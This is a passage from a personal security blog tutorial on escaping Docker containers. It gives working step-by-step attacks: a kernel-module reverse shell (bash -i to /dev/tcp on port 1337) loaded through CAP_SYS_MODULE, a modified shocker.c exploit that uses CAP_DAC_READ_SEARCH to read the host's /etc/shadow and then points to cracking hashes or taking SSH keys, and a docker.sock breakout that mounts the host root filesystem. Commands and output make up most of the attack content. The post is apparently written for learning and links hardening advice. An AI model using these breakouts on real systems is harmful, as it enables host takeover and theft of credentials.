+</pre></table></code></div></div><h3 id="capabilities"><span class="mr-2">Capabilities</span><a href="#capabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>So I noticed, just like with cgroups, I rambled on about capabilities but not really explained it. Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for the root user. So with capabilities we can for example allow binaries to be executed by a non-root user. The benefit of this is that we do not need to grant the non-root user full root permissions.</p><p>Docker starts containers with a set of linux kernel capabilities too and when not managed correctly you can create a fun little playground for hackers.</p><p>This chapter will go through some of the capabilities exploits.</p><h5 id="cap_sys_module"><span class="mr-2">CAP_SYS_MODULE</span><a href="#cap_sys_module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Like the above example, you can look wich capabilities are granted using the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>root@3a8315527c66:~# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+
+</pre></table></code></div></div><p>Notice the <strong>cap_sys_module</strong>, this module allows you to load and unload kernel modules. So what we can do is compile our own kernel module.</p><p>Fist we need to check the ip address of the Docker container:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/# hostname -I | awk '{print $1}'
+172.17.0.2
+
+</pre></table></code></div></div><p>We can see that the IP address of the docker container is 172.17.0.2. For this attack you need to understand that the host machine creates an interface that acts as a gateway for the docker network. The IP address between de docker host and the network which is called the gateway is mostly set on 172.17.0.1</p><p>So we are going to:</p><ul><li>Create our own kernel module with a reverse shell<li>Insert it to the host machine.<li>Let the host machine connect back to our docker container and granting us access to the host machine.</ul><p>Let’s get started!</p><p>Create the kernel module. I got the script from <a href="https://blog.nody.cc/posts/container-breakouts-part2/">here</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>
+<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; reverse-shell.c
+#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/172.17.0.2/1337 0&gt;&amp;1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO "Exiting</span><span class="se">\n</span><span class="sh">");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+</span><span class="no">EOF
+
+</span></pre></table></code></div></div><p>To be able to compile the kernel module, we need to create a Makefile: A Makefile is a bash script that is used to compile code, in our case the reverse-shell.c script.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/home/test# cat Makefile
+
+obj-m +=reverse-shell.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+</pre></table></code></div></div><p>You should now have two files:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/home/test# ls
+Makefile  reverse-shell.c
+</pre></table></code></div></div><p>Compile the kernel module:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/home/test# make
+</pre></table></code></div></div><p>Before we insert the kernel module start a listener in another terminal and make sure this session is also in the docker container.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@3a8315527c66:# nc -nlvp 1337
+listening on [any] 1337 ...
+</pre></table></code></div></div><p>Remember the chapter <a href="https://ch1mp3y.github.io/posts/Docker/#with-great-power-comes-great-responsibility">With great power comes great responsibility</a>? The container shares the kernel with the host. So if we insert the kernel module it is going to be shared with the host as well. The kernel module that we have just created will use the usermodehelper to create a reverse shell connection process from the userspace of the Docker host machine.</p><p>To insert the module we need to run insmod as shown below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>root@3a8315527c66:/home/test# insmod reverse-shell.ko
+</pre></table></code></div></div><p>Awesome! As you can see below we now have a connection to the host machine <strong>root@linux-box</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>root@3a8315527c66:# nc -lvlp 1337
+listening on [any] 1337 ...
+
+172.17.0.1: inverse host lookup failed: Unknown host
+connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 55010
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@linux-box:/#
+</pre></table></code></div></div><h5 id="dac_read_search"><span class="mr-2">DAC_READ_SEARCH</span><a href="#dac_read_search" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>DAC stands for Discretionary Access Control, which are basically your standard Linux ownership/permission flags. If the container is run with dac_read_search capability, any permission checks for reading files and directories is skipped. This basically allows us to read files without any restrictions, including those from the host system.</p><p>Lets look at the capabilities again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+
+</pre></table></code></div></div><p>Notice the dac_read_search capability, like I said: this means we are capable of reading files from the host system! I used the following <a href="http://stealth.openwall.net/xSports/shocker.c">script</a> in order to read the files.</p><p>So how does the script work?</p><p>The script is using the cap_dac_search capability to read the files, to make it work we first need a connection point to the host machine. For containers this should be a file mounted from the host system into the docker container. The script assumes it’s a file called <strong>.dockerinit</strong>, but it can be anything.</p><p>Once it has a point to start it tries to go through all the files until it finds the file you have set in the script. The default is <strong>/etc/shadows</strong></p><p>Before we continue to use the script we first want to see if we can access the mounted file. (.dockerinit in our case) If there is no .dockerinit file, we need to modify the script. Let’s search for the file using find:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# find / -name .dockerinit 2&gt;/dev/null
+root@1a7416577c80:~# 
+</pre></table></code></div></div><p>No luck. What we need is something that is connected to the host machine, a good point to start is by checking if something is mounted from the host machine.</p><p>Use <code class="language-plaintext highlighter-rouge">mount</code> to see if there are any files mounted:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# mount
+[...]
+/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
+/dev/sda2 on /etc/hostname type ext4 (rw,relatime,data=ordered)
+/dev/sda2 on /etc/hosts type ext4 (rw,relatime,data=ordered)
+
+</pre></table></code></div></div><p>We can see three files referenced from the host system, I’m going to use <strong>/etc/hostname</strong> but feel free to use other mounted files.</p><p>Now let’s modify the shocker.c script, the code that we need to change is almost at the very bottom of the script:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>
+// get a FS reference from something mounted in from outside
+	if ((fd1 = open("/.dockerinit", O_RDONLY)) &lt; 0)
+		die("[-] open");
+</pre></table></code></div></div><p>Change <strong>/.dockerinit</strong> to <strong>/etc/hostname</strong> (or whatever mounted file you picked):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>// get a FS reference from something mounted in from outside
+	if ((fd1 = open("/etc/hostname", O_RDONLY)) &lt; 0)
+		die("[-] open");
+</pre></table></code></div></div><p>We’re also going to parameterize the file to look for. So on the next line we need to change <strong>/etc/shadow</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>if (find_handle(fd1, "/etc/shadow", &amp;root_h, &amp;h) &lt;= 0)
+		die("[-] Cannot find valid handle!");
+</pre></table></code></div></div><p>To the following</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>if (find_handle(fd1, argv[1], &amp;root_h, &amp;h) &lt;= 0)
+		die("[-] Cannot find valid handle!");
+</pre></table></code></div></div><p>Before we compile it, we need to still change <strong>int main()</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>int main()
+{
+	char buf[0x1000];
+	int fd1, fd2;
+</pre></table></code></div></div><p>To the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>int main(int argc, char**argv)
+{
+	char buf[0x1000];
+	int fd1, fd2;
+</pre></table></code></div></div><p>We can now specify the file to look for via the command line!</p><p>Next, compile the script:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# gcc shocker.c -o shocked
+</pre></table></code></div></div><p>And run it (we output to a file called ‘shadow’ here using &amp;&gt; shadow):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# ./shocked /etc/shadow/ &amp;&gt; shadow
+[***] docker VMM-container breakout Po(C) 2014             [***]
+[***] The tea from the 90's kicks your sekurity again.     [***]
+[***] If you have pending sec consulting, I'll happily     [***]
+[***] forward to my friends who drink secury-tea too!      [***]
+[...]
+[*] Found shadow
+[+] Match: shadow ino=61498
+[*] Brute forcing remaining 32 bit. This can take a while...
+[*] (shadow) Trying: 0x00000000
+[*] #=8, 1, char nh[] = {0x3a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
+[!] Got a final handle!
+[*] #=8, 1, char nh[] = {0x3a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+Success!!
+root@1a7416577c80:~#
+</pre></table></code></div></div><p>When you look at the outputfile you will see the contents of <strong>/etc/shadow</strong> from the host system.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>root@1a7416577c80:~# cat shadow
+root:$6$TvYo6Q8EXPuY[...]
+daemon:*:18526:0:99999:7:::
+bin:*:18526:0:99999:7:::
+sys:*:18526:0:99999:7:::
+[...]
+
+</pre></table></code></div></div><p>All we have to do now is to try to crack the hash! or look into other files for other juicy information like the ssh key. A very detailed explanation about this exploit can be found <a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">here</a>.</p><h3 id="docker-socket-escape"><span class="mr-2">Docker socket escape</span><a href="#docker-socket-escape" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To manage other containers from inside a container the <strong>docker.socket</strong> is used.</p><p>For example to execute commands such as docker pull or docker run it needs a socket. This can be either a TCP socket or a UNIX socket. The Docker default is a UNIX socket.</p><p>TCP sockets use networking interfaces/adapters. The UNIX socket uses the filesystem directly. So this could be a problem when we have a user that has access to the Docker socket (docker.sock) and has permissions to run docker commands, because you can use filesystem permissions to decide who or what can read/write. This gives a hacker the opportunity to take over the host.</p><p>Lets see this in action!</p><p>Search for the <strong>docker.sock</strong> file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>chimpey@2b5fa5dc3215:/var/run$ find / -name docker.sock 2&gt;/dev/null
+/run/docker.sock
+
+</pre></table></code></div></div><p>Now what we need to know is if the user has permissions to run docker commands. We can check this by looking into groups, if the user is in the docker group, we probably can:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>chimpey@2b5fa5dc3215:/var/run$ groups
+chimpey docker
+
+</pre></table></code></div></div><p>What we can do now is mount the entire file system to a new container that runs as root:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>chimpey@2b5fa5dc3215:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys) [...]
+</pre></table></code></div></div><p>As you can see we have root access now!</p><h3 id="final-notes"><span class="mr-2">Final notes</span><a href="#final-notes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Well that’s it for today. There is obviously a whole lot more to tell and a whole lot more exploitations out there, so maybe in the future I will start a Docker part 2! For now: let all this information sink in and take a little walk outside and enjoy the day. I know I will.</p><p>For any mitigation advice take a look at the following article of <a href="https://snyk.io/blog/10-docker-image-security-best-practices/">Snyke</a>! They give some pretty good Docker advice in general.</p><p>I have to say, I’m really impressed you made it to the final notes! Thank you for exploring this Docker journey with me. Keep on hacking and see you on the next adventure.</p><h5 id="resources"><span class="mr-2">Resources</span><a href="#resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Attackdefence: https://attackdefense.pentesteracademy.com/listingnoauth?labtype=container-security-container-host-security&amp;subtype=container-security-container-host-security-breakouts<br /> blog.nody.cc: https://blog.nody.cc/posts/container-breakouts-part2/<br /> hacktricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation<br /> docker.socket: https://greencashew.dev/posts/docker-container-breakout-using-docker.sock/ <br /> Docker sheet cheat: https://dockerlabs.collabnix.com/docker/cheatsheet/ <br /> tbhaxor: https://tbhaxor.com/container-breakout-part-2/<br /> OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html<br /> TryHackme: https://tryhackme.com/room/dockerrodeo<br /> Snyke: https://snyk.io/blog/10-docker-image-security-best-practices/</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/knowledge-base/'>KNOWLEDGE BASE</a>, <a href='/categories/escaping-docker-containers-part-1/'>Escaping Docker containers part 1</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Escaping+Docker+containers+-+Ch1mp3y&url=http%3A%2F%2Fchimpey.com%2Fposts%2FDocker%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Escaping+Docker+containers+-+Ch1mp3y&u=http%3A%2F%2Fchimpey.com%2Fposts%2FDocker%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=http%3A%2F%2Fchimpey.com%2Fposts%2FDocker%2F&text=Escaping+Docker+containers+-+Ch1mp3y" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Websockets/">Hacking websockets</a><li><a href="/posts/Docker/">Escaping Docker containers</a><li><a href="/posts/TENTACLE/">HTB-Tentacle</a><li><a href="/posts/SECRET/">HTB-Secret</a><li><a href="/posts/DRIVER/">HTB-Driver</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Websockets/"><div class="card-body"> <em class="small" data-ts="1659264600" data-df="ll" > Jul 31, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hacking websockets</h3><div class="text-muted small"><p> categories: [Knowledge Base] tags: [websockets] — Index Intro What is a Websocket How to spot Websockets in the wild Authentication Input and output validation Cross-Site websocket...</p></div></div></a></div><div class="card"> <a href="/posts/TENTACLE/"><div class="card-body"> <em class="small" data-ts="1657543500" data-df="ll" > Jul 11, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Tentacle</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Tentacle] — Index enumeraing Proxy Squid Exploiting OpenSMTPD 2.0.0 The powers of Kerberos combined with SSH Exploiting the log_backup script ...</p></div></div></a></div><div class="card"> <a href="/posts/SECRET/"><div class="card-body"> <em class="small" data-ts="1657474920" data-df="ll" > Jul 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Secret</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Secret] — Target machine: 10.129.198.24 Attack machine: Secret from Hack the Box Index Enumerating Register user and Login Code Review Creating adm...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/TENTACLE/" class="btn btn-outline-primary" prompt="Older"><p>HTB-Tentacle</p></a> <a href="/posts/Websockets/" class="btn btn-outline-primary" prompt="Newer"><p>Hacking websockets</p></a></div><script src="https://utteranc.es/client.js" repo="Ch1mp3y/ch1mp3y.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Ch1mp3y</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" 